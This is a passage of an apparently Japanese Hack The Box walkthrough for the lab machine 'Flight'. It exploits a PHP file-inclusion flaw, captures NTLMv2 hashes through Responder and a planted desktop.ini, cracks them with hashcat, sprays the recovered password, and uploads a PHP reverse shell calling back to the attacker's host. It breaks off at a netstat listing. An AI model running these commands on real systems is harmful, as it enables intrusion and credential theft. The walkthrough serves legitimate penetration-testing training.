https://app.hackthebox.com/machines/Flight

## STEP 1
```sh
└─$ rustscan -a 10.129.200.222 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.200.222:53
Open 10.129.200.222:80
Open 10.129.200.222:88
Open 10.129.200.222:135
Open 10.129.200.222:139
Open 10.129.200.222:389
Open 10.129.200.222:445
Open 10.129.200.222:464
Open 10.129.200.222:593
Open 10.129.200.222:636
Open 10.129.200.222:3268
Open 10.129.200.222:3269
Open 10.129.200.222:5985
Open 10.129.200.222:9389
Open 10.129.200.222:49667
Open 10.129.200.222:49673
Open 10.129.200.222:49674
Open 10.129.200.222:49695
Open 10.129.200.222:49725
10.129.200.222 -> [53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49695,49725]
```


## STEP 2
ドメイン名取得
```sh
└─$ netexec smb 10.129.200.222                                                                                     
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
```
hosts編集
```sh
└─$  echo '10.129.200.222 flight.htb' | sudo tee -a /etc/hosts
10.129.200.222 flight.htb
```
80番にアクセス  
めぼしい情報は特になし  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_01.png">  
サブドメイン列挙  
別ウェブページを探索するため、サイズが異なるレスポンスを実施するドメインを調査
```sh
└─$ curl -I http://flight.htb
HTTP/1.1 200 OK
Date: Tue, 14 Oct 2025 08:07:10 GMT
Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
Last-Modified: Thu, 24 Feb 2022 05:58:10 GMT
ETag: "1b9d-5d8bd444f0080"
Accept-Ranges: bytes
Content-Length: 7069
Content-Type: text/html
```
schoolというサブドメイン発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.flight.htb' -u http://10.129.200.222 -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.200.222
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 286ms]
:: Progress: [19966/19966] :: Job [1/1] :: 129 req/sec :: Duration: [0:02:22] :: Errors: 0 ::
```
hosts追加
```sh
└─$ tail -n 1 /etc/hosts
10.129.200.222 flight.htb school.flight.htb
```


## STEP 3
school.flight.htbにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_02.png">  
ページ内の「Home」「About Us」「Blog」にそれぞれリンクが設定されていた  
```sh
http://school.flight.htb/index.php?view=home.html
http://school.flight.htb/index.php?view=about.html
http://school.flight.htb/index.php?view=blog.html
```
「About Us」「Blog」にアクセス、ページの１部分がファイルインクルード処理で変更されていことが分かる  
phpでファイルインクルード処理を実施しているが、lfiまたはrfiの脆弱性があるかも
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Flight_03.png">  
レスポンスサイズ「1102」（ファイルが存在しない場合）はフィルタしてfuzzing  
lfiの脆弱性を確認！
```sh
└─$ ffuf -c -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt -u 'http://school.flight.htb/index.php?view=FUZZ' -fs 1102     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://school.flight.htb/index.php?view=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1102
________________________________________________

C:/Windows/win.ini      [Status: 200, Size: 1194, Words: 149, Lines: 38, Duration: 493ms]
C:/WINDOWS/System32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 493ms]
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml [Status: 200, Size: 45670, Words: 8921, Lines: 700, Duration: 257ms]
c:/xampp/phpMyAdmin/config.inc.php [Status: 200, Size: 3153, Words: 274, Lines: 92, Duration: 259ms]
c:/xampp/sendmail/sendmail.ini [Status: 200, Size: 3198, Words: 431, Lines: 103, Duration: 254ms]
C:/xampp/apache/logs/access.log [Status: 200, Size: 263632, Words: 24083, Lines: 1638, Duration: 258ms]
C:/xampp/apache/logs/error.log [Status: 200, Size: 264345, Words: 28206, Lines: 1168, Duration: 262ms]
c:/xampp/apache/conf/httpd.conf [Status: 200, Size: 22337, Words: 2849, Lines: 597, Duration: 251ms]
c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 2460, Words: 588, Lines: 58, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/lmhosts.sam [Status: 200, Size: 4785, Words: 771, Lines: 110, Duration: 252ms]
c:/WINDOWS/system32/drivers/etc/networks [Status: 200, Size: 1509, Words: 231, Lines: 47, Duration: 254ms]
c:/WINDOWS/system32/drivers/etc/hosts [Status: 200, Size: 1926, Words: 315, Lines: 52, Duration: 258ms]
c:/xampp/php/php.ini    [Status: 200, Size: 75093, Words: 9638, Lines: 2026, Duration: 254ms]
c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1378, Words: 173, Lines: 35, Duration: 263ms]
c:/WINDOWS/system32/drivers/etc/services [Status: 200, Size: 18737, Words: 8656, Lines: 318, Duration: 257ms]
c:/xampp/apache/logs/error.log [Status: 200, Size: 283597, Words: 30173, Lines: 1239, Duration: 290ms]
c:/xampp/apache/logs/access.log [Status: 200, Size: 279512, Words: 25586, Lines: 1747, Duration: 295ms]
:: Progress: [236/236] :: Job [1/1] :: 62 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```
php.iniを確認、[リンク](https://web.archive.org/web/20240418085821/https://qiita.com/satorunooshie/items/39eda7b6a41909e89d29#allow_url_include)を参照  
allow_url_fopenが有効のためリモートファイルの読み込みは可能だが、allow_url_includeが無効のため実行はできないもよう
```sh
└─$ curl -s 'http://school.flight.htb/index.php?view=c:/xampp/php/php.ini' | grep 'allow_url_include\|allow_url_fopen'
allow_url_fopen = On
allow_url_include = Off
```
脆弱なindex.phpのソースコードをlfiで確認  
viewのパラメータに「..」や「//」などが含まれるとGET拒否される仕組み
```php
└─$ curl 'http://school.flight.htb/index.php?view=index.php'                           
<!DOCTYPE html>

~~~

<?php if (!isset($_GET['view']) || $_GET['view'] == "home.html") { ?>
    <div id="tagline">
      <div>
        <h4>Cum Sociis Nat PENATIBUS</h4>
        <p>Aenean leo nunc, fringilla a viverra sit amet, varius quis magna. Nunc vel mollis purus.</p>
      </div>
    </div>
<?php } ?>
  </div>
<?php

ini_set('display_errors', 0);
error_reporting(E_ERROR | E_WARNING | E_PARSE); 

if(isset($_GET['view'])){
$file=$_GET['view'];
if ((strpos(urldecode($_GET['view']),'..')!==false)||
    (strpos(urldecode(strtolower($_GET['view'])),'filter')!==false)||
    (strpos(urldecode($_GET['view']),'\\')!==false)||
    (strpos(urldecode($_GET['view']),'htaccess')!==false)||
    (strpos(urldecode($_GET['view']),'.shtml')!==false)
){
    echo "<h1>Suspicious Activity Blocked!";
    echo "<h3>Incident will be reported</h3>\r\n";
}else{
    echo file_get_contents($_GET['view']);
}
}else{
    echo file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");
}

?>

~~~
```
GET拒否されるviewパラメータを回避して、kaliのresponderに対するrfi実施  
rfiによってkaliのresponderにsmbアクセス・強制認証によりクレデンシャルを取得する
```sh
└─$ curl 'http://school.flight.htb/index.php?view=//10.10.16.4/share/a.txt'
```
flight\svc_apacheのntlmv2ハッシュ値を取得成功！
```sh
─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-SXXGVN35NIR]
    Responder Domain Name      [K6XI.LOCAL]
    Responder DCE-RPC Port     [47985]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.200.222
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E002D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```
取得したntlmv2ハッシュをクラック成功！
パスワード、S@Ss!K@*t13を取得
```sh
└─$ name-that-hash -f svc_apache.txt --no-banner
svc_apache::flight:7480e093cd0cc6d2:875288C3E4026DC8AF430F72BFABE029:010100000000000080D13ECEDB3CDC01BAFA2B06278EC63E00000000020008004B0036005800490001001E00570049004E002D00530058005800470056004E00330035004E004900520004003400570049004E0
02D00530058005800470056004E00330035004E00490052002E004B003600580049002E004C004F00430041004C00030014004B003600580049002E004C004F00430041004C00050014004B003600580049002E004C004F00430041004C000700080080D13ECEDB3CDC0106000400020000000800300
030000000000000000000000000300000E49FE70A59898E7F8BD0DFAACAC25A27200865B470E26F8E5D5FFA5FA56151400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2
```
```sh
└─$ hashcat -a 0 -m 5600 svc_apache.txt /usr/share/wordlists/rockyou.txt --quiet
SVC_APACHE::flight:7480e093cd0cc6d2:875288c3e4026dc8af430f72bfabe029:010100000000000080d13ecedb3cdc01bafa2b06278ec63e00000000020008004b0036005800490001001e00570049004e002d00530058005800470056004e00330035004e004900520004003400570049004e002d00530058005800470056004e00330035004e00490052002e004b003600580049002e004c004f00430041004c00030014004b003600580049002e004c004f00430041004c00050014004b003600580049002e004c004f00430041004c000700080080d13ecedb3cdc0106000400020000000800300030000000000000000000000000300000e49fe70a59898e7f8bd0dfaacac25a27200865b470e26f8e5d5ffa5fa56151400a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:S@Ss!K@*t13
```


## STEP 4
5985番は開いていたが、winrmログインできるユーザは存在しなかった
```sh
└─$ netexec ldap 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --groups 'Remote Management Users'
LDAP        10.129.200.222  389    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)
LDAP        10.129.200.222  389    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
LDAP        10.129.200.222  389    G0               [-] Group Remote Management Users has no members
```
smb列挙  
readできるフォルダにめぼしい情報はなかった
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --shares                
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Enumerated shares
SMB         10.129.200.222  445    G0               Share           Permissions     Remark
SMB         10.129.200.222  445    G0               -----           -----------     ------
SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
SMB         10.129.200.222  445    G0               C$                              Default share
SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.200.222  445    G0               Shared          READ            
SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.200.222  445    G0               Users           READ            
SMB         10.129.200.222  445    G0               Web             READ
```
ユーザ列挙
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\svc_apache' -p 'S@Ss!K@*t13' --users-export users.txt
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               -Username-                    -Last PW Set-       -BadPW- -Description-                                            
SMB         10.129.200.222  445    G0               Administrator                 2022-09-22 20:17:02 0       Built-in account for administering the computer/domain 
SMB         10.129.200.222  445    G0               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.200.222  445    G0               krbtgt                        2022-09-22 19:48:01 0       Key Distribution Center Service Account 
SMB         10.129.200.222  445    G0               S.Moon                        2022-09-22 20:08:22 0       Junion Web Developer 
SMB         10.129.200.222  445    G0               R.Cold                        2022-09-22 20:08:22 0       HR Assistant 
SMB         10.129.200.222  445    G0               G.Lors                        2022-09-22 20:08:22 0       Sales manager 
SMB         10.129.200.222  445    G0               L.Kein                        2022-09-22 20:08:22 0       Penetration tester 
SMB         10.129.200.222  445    G0               M.Gold                        2022-09-22 20:08:22 0       Sysadmin 
SMB         10.129.200.222  445    G0               C.Bum                         2022-09-22 20:08:22 0       Senior Web Developer 
SMB         10.129.200.222  445    G0               W.Walker                      2022-09-22 20:08:22 0       Payroll officer 
SMB         10.129.200.222  445    G0               I.Francis                     2022-09-22 20:08:22 0       Nobody knows why he's here 
SMB         10.129.200.222  445    G0               D.Truff                       2022-09-22 20:08:22 0       Project Manager 
SMB         10.129.200.222  445    G0               V.Stevens                     2022-09-22 20:08:22 0       Secretary 
SMB         10.129.200.222  445    G0               svc_apache                    2022-09-22 20:08:23 0       Service Apache web 
SMB         10.129.200.222  445    G0               O.Possum                      2022-09-22 20:08:23 0       Helpdesk 
SMB         10.129.200.222  445    G0               [*] Enumerated 15 local users: flight
SMB         10.129.200.222  445    G0               [*] Writing 15 local users to users.txt
```
svc_apacheパスワードの使いまわし調査  
s.moonが使いまわしていることを確認
```sh
└─$ netexec smb 10.129.200.222 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.200.222  445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```


## STEP 5
s.moonユーザでsmb列挙  
sharedにwrite権限が付与されることを確認
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\s.moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Enumerated shares
SMB         10.129.200.222  445    G0               Share           Permissions     Remark
SMB         10.129.200.222  445    G0               -----           -----------     ------
SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
SMB         10.129.200.222  445    G0               C$                              Default share
SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.200.222  445    G0               Shared          READ,WRITE      
SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.200.222  445    G0               Users           READ            
SMB         10.129.200.222  445    G0               Web             READ
```
write可能フォルダ内のファイルにユーザがアクセスすると仮定した際の攻撃を考える  
kaliにsmb認証を要求するファイルにアクセスした際、responder経由でユーザの認証リクエストを取得できる  
リモートリソースにアクセスする設定が可能なファイルはいくつかあるか、今回はdesktop.iniを使用する
```sh
└─$ git clone -q https://github.com/Greenwolf/ntlm_theft.git

└─$ python3.13 ntlm_theft/ntlm_theft.py -g desktopini -s 10.10.16.4 -f test
/home/kali/htb/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: test/desktop.ini (BROWSE TO FOLDER)
Generation Complete.

└─$ cat test/desktop.ini 
[.ShellClassInfo]
IconResource=\\10.10.16.4\aa 
```
sharedに作成したdesktop.iniを投下
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\s.moon' -p 'S@Ss!K@*t13' --share Shared --put-file '/home/kali/test/desktop.ini' '/desktop.ini'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\s.moon:S@Ss!K@*t13 
SMB         10.129.200.222  445    G0               [*] Copying /home/kali/test/desktop.ini to /desktop.ini
SMB         10.129.200.222  445    G0               [+] Created file /home/kali/test/desktop.ini on \\Shared\/desktop.ini
```
responderでsmb認証をキャプチャ  
c.bumのntlmv2ハッシュを取得成功！
```sh
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-6DYRA9SLDQC]
    Responder Domain Name      [ZFPM.LOCAL]
    Responder DCE-RPC Port     [46980]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.200.222
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:40702e4077420c0e:394C704F40664B2DC0D4C9FB23557E61:01010000000000000009CD3E433DDC01D93AED061CB69BDE00000000020008005A00460050004D0001001E00570049004E002D0036004400590052004100390053004C0044005100430004003400570049004E002D0036004400590052004100390053004C004400510043002E005A00460050004D002E004C004F00430041004C00030014005A00460050004D002E004C004F00430041004C00050014005A00460050004D002E004C004F00430041004C00070008000009CD3E433DDC0106000400020000000800300030000000000000000000000000300000CE4B0228DBB7891B107A33DF935AFC90D4D951B1C353270577762DA1378815910A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0034000000000000000000
```
クラック成功！  
c.bumのパスワードは「Tikkycoll_431012284」
```sh
└─$ hashcat -a 0 -m 5600 c.bum.txt /usr/share/wordlists/rockyou.txt --quiet     
C.BUM::flight.htb:40702e4077420c0e:394c704f40664b2dc0d4c9fb23557e61:01010000000000000009cd3e433ddc01d93aed061cb69bde00000000020008005a00460050004d0001001e00570049004e002d0036004400590052004100390053004c0044005100430004003400570049004e002d0036004400590052004100390053004c004400510043002e005a00460050004d002e004c004f00430041004c00030014005a00460050004d002e004c004f00430041004c00050014005a00460050004d002e004c004f00430041004c00070008000009cd3e433ddc0106000400020000000800300030000000000000000000000000300000ce4b0228dbb7891b107a33df935afc90d4d951b1c353270577762da1378815910a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000:Tikkycoll_431012284
```
c.bumのプロファイル内にユーザフラグ発見！
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share Users --get-file 'c.bum/desktop/user.txt' '/home/kali/user.txt'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.200.222  445    G0               [*] Copying "c.bum/desktop/user.txt" to "/home/kali/user.txt"
SMB         10.129.200.222  445    G0               [+] File "c.bum/desktop/user.txt" was downloaded to "/home/kali/user.txt"

└─$ cat user.txt 
d8b9ecfbaa5e71842169b964146d25ff
```


## STEP 6
smb列挙  
ユーザc.bumにはwebにwrite権限が付与されていた
```sh
└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --shares                                                               
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.200.222  445    G0               [*] Enumerated shares
SMB         10.129.200.222  445    G0               Share           Permissions     Remark
SMB         10.129.200.222  445    G0               -----           -----------     ------
SMB         10.129.200.222  445    G0               ADMIN$                          Remote Admin
SMB         10.129.200.222  445    G0               C$                              Default share
SMB         10.129.200.222  445    G0               IPC$            READ            Remote IPC
SMB         10.129.200.222  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.200.222  445    G0               Shared          READ,WRITE      
SMB         10.129.200.222  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.200.222  445    G0               Users           READ            
SMB         10.129.200.222  445    G0               Web             READ,WRITE
```
web内にはSTEP2から確認できるwebのファイルが確認できる  
ここにphpリバースシェルを配置し、リバースシェルを取得する
```sh
└─$ smbclient -U 'flight.htb/c.bum%Tikkycoll_431012284' -c 'dir' //10.129.200.222/web
  .                                   D        0  Wed Oct 15 07:32:00 2025
  ..                                  D        0  Wed Oct 15 07:32:00 2025
  flight.htb                          D        0  Wed Oct 15 07:32:00 2025
  school.flight.htb                   D        0  Wed Oct 15 07:32:00 2025

                5056511 blocks of size 4096. 1245515 blocks available
```
phpのリバースシェルだが、pentestmonkeyはwindows用ではなさそうだったため、ivan-sincekを使用する  
リッスンipアドレスを変更して、school.flight.htb配下に転送し実行
```sh
└─$ wget -nv https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php
2025-10-15 00:35:47 URL:https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php [9403/9403] -> "php_reverse_shell.php" [1]

└─$ sed -i.bak "s/Shell('127\.0\.0\.1', 9000)/Shell('10.10.16.4', 4444)/g" php_reverse_shell.php

└─$ netexec smb 10.129.200.222 -u 'flight.htb\c.bum' -p 'Tikkycoll_431012284' --share web --put-file '/home/kali/php_reverse_shell.php' '\school.flight.htb\shell.php'
SMB         10.129.200.222  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False) 
SMB         10.129.200.222  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.129.200.222  445    G0               [*] Copying /home/kali/php_reverse_shell.php to \school.flight.htb\shell.php
SMB         10.129.200.222  445    G0               [+] Created file /home/kali/php_reverse_shell.php on \\web\\school.flight.htb\shell.php

└─$ curl 'http://school.flight.htb/shell.php'
```
svc_apacheのリバースシェル取得
```sh
└─$ rlwrap nc -lnvp 4444       
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.200.222] 63803
SOCKET: Shell has connected! PID: 7132
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb>whoami
flight\svc_apache
```
ポート確認
STEP1で確認されなかったtcp「8000」番ポートを確認
```powershell
C:\xampp\htdocs\school.flight.htb>netstat -ano -p tcp

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5796
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5796
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       916
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
